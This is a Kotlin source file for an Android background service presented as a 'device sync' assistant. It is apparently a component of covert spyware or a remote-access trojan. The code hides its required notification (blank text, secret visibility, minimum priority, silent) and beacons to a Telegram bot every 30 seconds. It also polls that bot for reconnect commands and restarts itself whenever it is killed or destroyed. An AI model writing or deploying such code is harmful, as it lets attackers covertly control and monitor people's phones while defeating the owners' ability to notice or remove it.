package com.devicesync.assistant.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import com.devicesync.assistant.R
import com.devicesync.assistant.helpers.ConfigHelper
import com.devicesync.assistant.helpers.SyncHelper

class DeviceSyncService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private val CHANNEL_ID = "device_sync_channel"
    private val NOTIFICATION_ID = 1
    private val HEARTBEAT_INTERVAL = 30000L  // 30 seconds
    private val RECONNECT_CHECK = 15000L     // 15 seconds
    private var isRunning = false

    // ─────────────────────────────────────────
    // ON START COMMAND
    // ─────────────────────────────────────────
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification())
        if (!isRunning) {
            isRunning = true
            startHeartbeat()
            startReconnectChecker()
            SyncHelper.sendDeviceOnline()
        }
        return START_STICKY  // Restart automatically if killed
    }

    // ─────────────────────────────────────────
    // HEARTBEAT
    // Sends ping to Telegram bot every 30 seconds
    // Bot knows app is alive
    // ─────────────────────────────────────────
    private fun startHeartbeat() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (isRunning) {
                    SyncHelper.sendHeartbeat()
                    handler.postDelayed(this, HEARTBEAT_INTERVAL)
                }
            }
        }, HEARTBEAT_INTERVAL)
    }

    // ─────────────────────────────────────────
    // RECONNECT CHECKER
    // Checks if bot sent a reconnect signal
    // ─────────────────────────────────────────
    private fun startReconnectChecker() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (isRunning) {
                    SyncHelper.checkReconnectSignal()
                    handler.postDelayed(this, RECONNECT_CHECK)
                }
            }
        }, RECONNECT_CHECK)
    }

    // ─────────────────────────────────────────
    // BUILD SILENT NOTIFICATION
    // Required for foreground service
    // Silent — no sound, no vibration
    // ─────────────────────────────────────────
    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(true)
            .build()
    }

    // ─────────────────────────────────────────
    // CREATE NOTIFICATION CHANNEL
    // ─────────────────────────────────────────
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Sync Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    // ─────────────────────────────────────────
    // ON DESTROY — RESTART AUTOMATICALLY
    // ─────────────────────────────────────────
    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        // Restart service immediately
        val restartIntent = Intent(applicationContext, DeviceSyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent)
        } else {
            startService(restartIntent)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
